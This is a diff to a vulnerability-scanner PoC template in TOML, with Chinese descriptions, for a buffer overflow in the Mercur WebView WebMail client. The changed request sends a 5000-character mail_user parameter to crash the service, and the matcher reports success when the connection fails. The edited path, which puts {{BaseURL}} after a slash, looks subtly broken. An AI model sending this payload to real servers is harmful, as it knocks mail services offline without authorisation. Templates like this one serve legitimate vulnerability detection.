@@ -1,8 +1,8 @@
 [info]
 author = "ave"
-description = "通过向 Mercur WebView WebMail-Client 端口 1080 发送包含超长 mail_user 参数的 GET 请求触发缓冲区溢出，导致服务崩溃拒绝服务"
+description = "向 WebView WebMail 服务器发送包含超长 mail_user 参数的 GET 请求，触发缓冲区溢出导致服务崩溃。验证方式：发送溢出 payload 后检测服务是否无响应。"
 id = "POC-AVE-2000-0217"
-name = "Atrium Software Mercur WebView WebMail-Client 1.0 Buffer Overflow PoC"
+name = "Atrium Software Mercur WebView WebMail 缓冲区溢出 PoC"
 severity = "medium"
 tags = ["ave-2000-0217"]
 vuln_id = [
@@ -15,14 +15,16 @@ logic = "all"
 
 [[poc.requests]]
 method = "GET"
-path = "/&mail_user={{repeat('A', 1200)}}"
+path = "/{{BaseURL}}/mmain.html&mail_user={{repeat('A', 5000)}}"
 protocol = "http"
 
 [[poc.requests.matchers]]
-expect = false
+expect = true
 part = "body"
 type = "word"
 words = [
-    "Service Unavailable",
-    "connection refused",
+    "refused",
+    "reset",
+    "timeout",
+    "closed",
 ]
